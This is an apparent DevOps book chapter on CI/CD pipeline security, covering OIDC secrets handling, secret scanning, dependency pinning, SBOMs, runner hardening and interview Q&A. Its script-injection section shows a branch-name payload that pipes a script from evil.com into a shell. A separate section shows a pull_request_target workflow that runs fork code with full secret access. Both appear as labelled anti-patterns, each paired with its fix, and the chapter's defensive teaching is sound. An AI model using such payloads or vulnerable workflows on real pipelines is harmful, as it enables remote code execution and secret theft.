---
title: Pipeline Security
part: 8
chapter: 0
slug: cicd-security
level: advanced # beginner | intermediate | advanced
reading_time: 12
updated: 2026-08-28
tags: [devops, cicd, security]
in_book: true
---

# Pipeline Security {#ch-cicd-security}

> Treat the pipeline as production infrastructure and close the paths an attacker uses to reach it.

**In this chapter:** why pipelines are targeted · secrets management · supply chain and SBOMs · hardening the runner · audit and traceability

## Why the Pipeline Is a Prime Target

```
Attacker compromises one build step
        ↓
Has: source code + cloud credentials + push access to the registry
        ↓
Can: inject code into an artifact that deploys itself to production
```

> A compromised laptop affects one developer. A compromised pipeline affects every deployment, and the malicious code arrives through a trusted, signed, audited path.

## Secrets Management

### The Hierarchy — Worst to Best

| Approach | Risk | Verdict |
|----------|------|---------|
| Hardcoded in the repo | Permanent leak, in git history forever | 🔴 Never |
| Plaintext in pipeline YAML | Visible to everyone with read access | 🔴 Never |
| CI platform secret store | Long-lived, manual rotation | ⚠️ Acceptable for non-cloud secrets |
| Secrets Manager / Vault at runtime | Centralized, rotatable, audited | ✅ Good |
| **OIDC — no stored secret at all** | Short-lived, scoped, no rotation needed | ✅ Best |

### OIDC Is the Answer for Cloud Access

```
CI job requests JWT ──▶ CI platform's OIDC provider
        ↓
JWT claims: repo, branch, environment, workflow
        ↓
sts:AssumeRoleWithWebIdentity ──▶ AWS validates claims against trust policy
        ↓
Temporary credentials (expire in ~1 hour)
```

✅ Nothing to store, nothing to rotate, nothing to leak. The trust policy is where you enforce who can deploy where.

```json
{
  "Condition": {
    "StringEquals": {
      "token.actions.githubusercontent.com:sub":
        "repo:acme/api:environment:production"
    }
  }
}
```

⚠️ **The most common OIDC mistake** is a loose `sub` condition. `repo:acme/*` means any repository in the organization — including a new one an attacker gets merged — can assume the production deploy role. Pin the repository and the environment or branch.

### Runtime Secret Fetching

For non-cloud secrets (third-party API keys, database passwords):

```yaml
- name: Fetch secrets at runtime
  run: |
    # OIDC role already assumed above — no stored AWS key
    DB_PASS=$(aws secretsmanager get-secret-value \
      --secret-id prod/db/password \
      --query SecretString --output text)
    echo "::add-mask::$DB_PASS"        # mask before any use
```

✅ Fetch at runtime, never store in the CI platform. Rotation happens in one place and no pipeline needs updating.

### Secret Scanning

Prevent secrets from entering the repository at all.

| Layer | Tool | Catches |
|-------|------|---------|
| **Pre-commit hook** | gitleaks, detect-secrets | Before commit — cheapest fix |
| **Push protection** | GitHub secret scanning | Blocks the push |
| **CI job** | gitleaks, TruffleHog | Full history scan |
| **Provider side** | GitHub partner alerts | Revokes known token formats |

```yaml
secret-scan:
  steps:
    - uses: actions/checkout@v6
      with: { fetch-depth: 0 }        # full history required
    - run: gitleaks detect --redact --exit-code 1
```

⚠️ A leaked secret is **compromised the moment it is pushed**, even if you force-push it away. Rotate it — do not just delete the commit. Forks, clones, and CI caches keep copies.

## Supply Chain Security

### Pin Your Dependencies

| Risk | Mitigation |
|------|-----------|
| Malicious npm package version | `npm ci` with a committed lockfile |
| Compromised action tag | Pin actions to a **full commit SHA** |
| Mutable base image | Pin Docker images by digest (`@sha256:...`) |
| Typosquatted package | Allowlist registries, use CodeArtifact as a proxy |

❌ **Mutable references — a tag can be moved by whoever owns it:**

```yaml
- uses: some-org/deploy-action@v2          # tag can be repointed
FROM node:22                               # tag rebuilt weekly
```

✅ **Immutable references:**

```yaml
- uses: some-org/deploy-action@a1b2c3d4e5f6...   # exact commit
FROM node:22-alpine@sha256:abcd1234...          # exact image
```

> The 2025 wave of npm and GitHub Actions supply chain attacks worked precisely because most consumers referenced mutable tags. Pinning by digest is the single highest-value control here.

### Dependency and Image Scanning

```yaml
scan:
  steps:
    # Dependency vulnerabilities (SCA)
    - run: npm audit --audit-level=high
    # Container image + filesystem scan
    - run: trivy image --exit-code 1 --severity HIGH,CRITICAL $IMAGE
    # Infrastructure as code policy
    - run: checkov -d ./terraform --compact
```

| Scan Type | Tool | What It Finds |
|-----------|------|--------------|
| **SCA** | npm audit, Snyk, Dependabot | Known CVEs in dependencies |
| **SAST** | SonarQube, Semgrep, CodeQL | Insecure code patterns |
| **Container** | Trivy, Grype, ECR scanning | OS and library CVEs in the image |
| **IaC** | Checkov, tfsec, Trivy | Public S3 buckets, open security groups |
| **DAST** | OWASP ZAP | Runtime vulnerabilities against a deployed app |

✅ **Fail the build only on HIGH and CRITICAL.** Failing on every low-severity finding trains the team to skip the gate.

⚠️ Base image CVEs are the biggest source of noise. Switching to a distroless or Alpine base often removes 90% of findings, because there are simply fewer packages installed.

### SBOM and Provenance

An **SBOM** (Software Bill of Materials) lists everything inside your artifact.

```bash
# Generate an SBOM during build
syft $IMAGE -o cyclonedx-json > sbom.json

# Sign the image so consumers can verify origin
cosign sign --key awskms:///alias/signing-key $IMAGE
cosign verify --key awskms:///alias/signing-key $IMAGE
```

✅ SBOMs turn "are we affected by this new CVE?" from a week of investigation into a query. This is now a compliance requirement in many enterprise and public sector contracts.

## Hardening the Pipeline Itself

| Control | Why |
|---------|-----|
| **Least privilege tokens** | Start at read-only; widen per job |
| **Separate build and deploy roles** | A build compromise should not grant deploy |
| **Protected branches** | Require review + passing checks before merge |
| **Environment approvals** | Human gate before production |
| **Ephemeral runners** | No state carries between builds |
| **No self-hosted runners on public repos** | Any fork PR runs code on your infra |
| **Signed commits** | Prove authorship |

**Least privilege in practice:**

```yaml
permissions:
  contents: read          # workflow default

jobs:
  build:
    permissions:
      contents: read      # nothing more needed
  deploy:
    permissions:
      contents: read
      id-token: write     # only this job can assume the AWS role
```

### The Pull Request Trust Boundary

```
pull_request         → fork code runs WITHOUT secrets   ✅ safe
pull_request_target  → fork code context WITH secrets   🔴 dangerous
```

❌ **A well-known exploit pattern:**

```yaml
on: pull_request_target      # runs with repo secrets
jobs:
  build:
    steps:
      - uses: actions/checkout@v6
        with:
          ref: ${{ github.event.pull_request.head.sha }}   # attacker's code
      - run: npm ci && npm run build   # arbitrary code, full secret access
```

✅ Use `pull_request` for anything that executes contributor code. If you genuinely need `pull_request_target`, never check out the PR head, and require an approving label before the workflow runs.

### Script Injection

Event data is attacker-controlled text.

❌ **Vulnerable:**

```yaml
- run: echo "Branch: ${{ github.event.pull_request.head.ref }}"
# Branch named: a";curl evil.com/x.sh|sh;"  → executes on the runner
```

✅ **Safe — pass as an environment variable:**

```yaml
- env:
    BRANCH: ${{ github.event.pull_request.head.ref }}
  run: echo "Branch: $BRANCH"       # treated as data
```

> Rule: never interpolate `${{ github.event.* }}` directly inside a `run` block.

## Shift Left

```
Cost to fix a security issue:

IDE / pre-commit    $
Pull request       $$
Staging           $$$
Production      $$$$$$   (+ incident, disclosure, audit)
```

**Where each control belongs:**

| Stage | Controls |
|-------|----------|
| **IDE / pre-commit** | Secret scanning, linter security rules |
| **Pull request** | SAST, SCA, IaC scan, `terraform plan` review |
| **Build** | Image scan, SBOM, signing |
| **Pre-deploy** | Policy gates (OPA), approval |
| **Runtime** | GuardDuty, Security Hub, drift detection |

✅ Shift left does not mean "only test early" — it means catch each class of issue at the earliest stage where it is detectable, and keep runtime detection as the backstop.

## Audit and Traceability

You should be able to answer, for anything running in production:

- Which commit produced it?
- Who approved the deployment?
- Which scans ran, and what did they find?
- Which identity performed the deploy, and when?

| Requirement | How |
|-------------|-----|
| Artifact → commit | Tag images with the commit SHA |
| Immutable artifacts | ECR tag immutability |
| Deploy identity | OIDC role sessions named with the run ID, visible in CloudTrail |
| Approval record | Environment protection rules / CodePipeline approvals |
| Scan evidence | Upload reports as retained artifacts |

## Interview Q&A

**Q: How do you manage secrets in a CI/CD pipeline?**

For cloud access, I remove stored secrets entirely and use OIDC federation: the CI platform issues a short-lived signed token, the job exchanges it for temporary cloud credentials, and the cloud trust policy restricts which repository, branch, and environment may assume which role. There is nothing to rotate or leak. For non-cloud secrets such as third-party API keys, I store them in Secrets Manager or Vault and fetch them at runtime using that same OIDC-derived identity, rather than copying them into the CI platform's secret store. I also run secret scanning at pre-commit and in CI, and treat any leaked credential as compromised — rotate it rather than just rewriting history.

**Q: What is the risk of `pull_request_target` and when would you use it?**

`pull_request_target` runs the workflow in the context of the base repository, which means it has access to repository secrets and a writable token, while the pull request itself may come from an untrusted fork. If such a workflow checks out the pull request head and runs any build step, install script, or test, the contributor's code executes with full access to your secrets. That is a complete pipeline compromise from an anonymous pull request. Use plain `pull_request` for anything that executes contributor code — it runs without secrets by design. Reserve `pull_request_target` for workflows that only need metadata, such as labelling or commenting, and never check out the head commit in them.

**Q: How do you secure the software supply chain?**

Pin everything to immutable references: a committed lockfile with `npm ci`, third-party actions pinned to full commit SHAs rather than tags, and base images pinned by digest rather than tag. Scan at multiple layers — dependencies for known CVEs, the built image for OS and library vulnerabilities, and infrastructure code for misconfigurations — failing the build on high and critical findings. Generate an SBOM during the build and store it with the artifact, so when a new CVE is published you can answer whether you are affected by querying rather than investigating. Sign artifacts with cosign and verify signatures at deploy time so only images your pipeline produced can run.

**Q: Where in the pipeline should security checks run?**

Each class of issue belongs at the earliest stage where it can be detected. Secret scanning goes in pre-commit hooks and push protection, because a secret that reaches the remote is already compromised. Static analysis and dependency scanning run on the pull request, where the author has full context and the fix is cheap. Container scanning, SBOM generation, and signing happen at build time, on the actual artifact. Policy gates such as OPA or Checkov run before deploy. Runtime detection with GuardDuty and Security Hub is the backstop for what earlier stages cannot see, like credential misuse or a vulnerability disclosed after deployment.

**Q: A production deployment goes bad and you suspect the pipeline. What do you need in place to investigate?**

Traceability from the running artifact back to a commit. Images tagged with the commit SHA and tag immutability enabled in ECR, so what ran cannot be silently replaced. OIDC role sessions named with the pipeline run identifier, so CloudTrail shows exactly which pipeline run performed which API calls and when. Environment approval records showing who authorized the release. Scan reports retained as artifacts, so you can prove what was and was not checked. And the pipeline definition itself in version control, so you can see whether the pipeline logic changed alongside the code. Without those, an incident review becomes guesswork.

---

[← Testing in CI/CD](./04-testing.md) | [CI/CD Index](./README.md)
